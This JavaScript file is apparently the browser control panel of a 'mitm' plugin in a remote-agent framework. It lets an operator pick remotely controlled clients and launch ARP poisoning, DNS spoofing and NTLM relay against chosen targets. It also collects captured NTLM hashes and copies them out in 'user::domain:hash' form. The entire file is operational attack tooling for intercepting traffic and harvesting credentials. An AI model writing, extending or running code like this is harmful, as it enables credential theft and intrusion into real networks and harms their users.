const PLUGIN_ID = "mitm";

let currentClientId = "";
let hashes = [];

const $ = (id) => document.getElementById(id);

async function rpc(method, params = {}) {
  const res = await fetch(`/api/plugins/${PLUGIN_ID}/rpc`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ method, params }),
  });
  const body = await res.json().catch(() => ({}));
  if (!body.ok) throw new Error(body.error || `rpc ${method} failed: ${res.status}`);
  return body.result;
}

async function sendEvent(event, payload = {}) {
  if (!currentClientId) {
    log("no client id set", "err");
    return;
  }
  await fetch(`/api/clients/${currentClientId}/plugins/${PLUGIN_ID}/event`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ event, payload }),
  });
}

function setBadge(state) {
  const b = $("statusBadge");
  b.className = "badge " + (state || "idle");
  b.textContent = state || "idle";
}

function log(text, kind = "") {
  const el = $("log");
  const line = document.createElement("div");
  line.className = "line" + (kind ? " " + kind : "");
  const ts = document.createElement("span");
  ts.className = "ts";
  ts.textContent = new Date().toLocaleTimeString();
  line.appendChild(ts);
  line.appendChild(document.createTextNode(text));
  el.appendChild(line);
  while (el.children.length > 200) el.removeChild(el.firstChild);
  el.scrollTop = el.scrollHeight;
}

function parseSpoofMap(text) {
  const map = {};
  text.split("\n").forEach((line) => {
    const m = line.split("=");
    if (m.length === 2) {
      const k = m[0].trim().toLowerCase();
      const v = m[1].trim();
      if (k && v) map[k] = v;
    }
  });
  return map;
}

function collectSettings() {
  return {
    iface: $("iface").value.trim(),
    gateway: $("gateway").value.trim(),
    targets: $("targets").value.split("\n").map((s) => s.trim()).filter(Boolean),
    captureNTLM: $("captureNTLM").checked,
    enableRelay: $("enableRelay").checked,
    relayTarget: $("relayTarget").value.trim(),
    dnsSpoof: parseSpoofMap($("dnsSpoof").value),
    dnsUpstream: $("dnsUpstream").value.trim(),
  };
}

function renderHashes(list) {
  hashes = list || [];
  $("hashCount").textContent = hashes.length;
  const body = $("hashBody");
  body.innerHTML = "";
  if (!hashes.length) {
    $("hashEmpty").style.display = "block";
    return;
  }
  $("hashEmpty").style.display = "none";
  hashes.forEach((h) => {
    const tr = document.createElement("tr");
    for (const [cls, val] of [["host", h.host], ["user", h.user], ["domain", h.domain], ["", h.proto]]) {
      const td = document.createElement("td");
      if (cls) td.className = cls;
      td.textContent = val || "-";
      tr.appendChild(td);
    }
    const td = document.createElement("td");
    td.className = "hash";
    td.textContent = h.hash || "-";
    td.title = "click to copy";
    td.onclick = () => navigator.clipboard.writeText(h.hash).then(() => log("hash copied", "ok"));
    tr.appendChild(td);
    body.appendChild(tr);
  });
}

function feed(elId, html) {
  const el = $(elId);
  if (el.classList.contains("empty")) {
    el.classList.remove("empty");
    el.innerHTML = "";
  }
  const row = document.createElement("div");
  row.className = "row-item";
  row.innerHTML = html;
  el.appendChild(row);
  while (el.children.length > 120) el.removeChild(el.firstChild);
  el.scrollTop = el.scrollHeight;
}

function handleStream(data) {
  if (!data) return;
  const evt = data.event;
  const p = data.payload ?? data;
  if (p && p.clientId && p.clientId !== currentClientId) return;

  switch (evt) {
    case "status":
      setBadge(p.state);
      if (p.detail) log(p.detail);
      break;
    case "hosts":
      $("hostCount").textContent = `${(p.hosts || []).length} host(s) in arp table`;
      (p.hosts || []).forEach((h) => log(`${h.ip}  ${h.mac}`));
      break;
    case "ifaces":
      renderIfaces(p.ifaces || []);
      break;
    case "hash":
      loadHashes();
      log(`hash captured from ${p.host} (${p.user || "?"})`, "ok");
      break;
    case "poison":
      feed("poisonList", `<span class="hl">${p.proto}</span> ${p.name} <span class="hl">${p.from}</span>`);
      break;
    case "dnsspoof":
      feed("poisonList", `DNS <span class="hl">${p.domain}</span> -> ${p.answer} <span class="hl">${p.from}</span>`);
      break;
    case "relay":
      feed("relayList", `${p.victim} -> ${p.target} <span class="${p.success ? "ok" : "bad"}">${p.success ? "SUCCESS" : p.status}</span>`);
      break;
    case "host":
      log(`${p.host}: ${p.status}${p.detail ? " — " + p.detail : ""}`);
      break;
    case "error":
      log(p.message || "error", "err");
      break;
    default:
      break;
  }
}

function renderIfaces(list) {
  const el = $("ifaceList");
  if (!list.length) {
    el.textContent = "no usable interfaces";
    return;
  }
  el.innerHTML = "";
  list.forEach((i) => {
    const d = document.createElement("div");
    d.textContent = `${i.index}: ${i.name}  ${i.ip}`;
    d.style.cursor = "pointer";
    d.onclick = () => { $("iface").value = String(i.index); };
    el.appendChild(d);
  });
}

function connectStream() {
  const es = new EventSource(`/api/plugins/${PLUGIN_ID}/stream`);
  ["status", "hosts", "ifaces", "hash", "poison", "dnsspoof", "relay", "host", "error", "pong"].forEach((ch) => {
    es.addEventListener(ch, (ev) => {
      let data;
      try { data = JSON.parse(ev.data); } catch { data = null; }
      if (data != null) handleStream({ event: ch, payload: data });
    });
  });
  es.onerror = () => {
    es.close();
    setTimeout(connectStream, 3000);
  };
}

async function loadHashes() {
  if (!currentClientId) return;
  try {
    renderHashes(await rpc("list_hashes", { clientId: currentClientId }));
  } catch (e) {}
}

async function loadConfig() {
  if (!currentClientId) return;
  try {
    const cfg = await rpc("get_config", { clientId: currentClientId });
    if (cfg.iface) $("iface").value = cfg.iface;
    if (cfg.gateway) $("gateway").value = cfg.gateway;
    if (cfg.targets) $("targets").value = (cfg.targets || []).join("\n");
    if (cfg.relayTarget) $("relayTarget").value = cfg.relayTarget;
    if (cfg.dnsUpstream) $("dnsUpstream").value = cfg.dnsUpstream;
    if (cfg.dnsSpoof) {
      $("dnsSpoof").value = Object.entries(cfg.dnsSpoof).map(([k, v]) => `${k} = ${v}`).join("\n");
    }
    $("captureNTLM").checked = cfg.captureNTLM !== false;
    $("enableRelay").checked = !!cfg.enableRelay;
  } catch (e) {}
}

async function refreshClients() {
  try {
    const clients = await rpc("list_clients");
    const dl = $("clientsList");
    dl.innerHTML = "";
    clients.forEach((c) => {
      const o = document.createElement("option");
      o.value = c.clientId;
      dl.appendChild(o);
    });
    $("clientCount").textContent =
      clients.length ? `${clients.length} client(s) seen` : "no clients seen yet";
    if (clients.length && !currentClientId) {
      currentClientId = clients[0].clientId;
      $("clientId").value = currentClientId;
      loadConfig();
      loadHashes();
    }
  } catch (e) {}
}

function bind() {
  $("clientId").addEventListener("change", (e) => {
    currentClientId = e.target.value.trim();
    loadConfig();
    loadHashes();
  });

  $("refreshClients").addEventListener("click", refreshClients);
  $("loadIfaces").addEventListener("click", () => sendEvent("ifaces"));
  $("discover").addEventListener("click", () => sendEvent("discover"));

  $("start").addEventListener("click", async () => {
    const s = collectSettings();
    try {
      await rpc("save_config", { clientId: currentClientId, config: s });
      await sendEvent("start", s);
      setBadge("starting");
      log("mitm starting");
    } catch (e) {
      log("start failed: " + e.message, "err");
    }
  });

  $("stop").addEventListener("click", async () => {
    await sendEvent("stop");
    setBadge("idle");
    log("stop sent — ARP restore in flight");
  });

  $("copyHashes").addEventListener("click", () => {
    if (!hashes.length) return;
    const text = hashes
      .map((h) => `${h.user}::${h.domain || ""}:${h.hash}`)
      .join("\n");
    navigator.clipboard.writeText(text).then(() => log(`copied ${hashes.length} hash(es)`, "ok"));
  });
}

bind();
connectStream();
loadConfig();
loadHashes();
refreshClients();
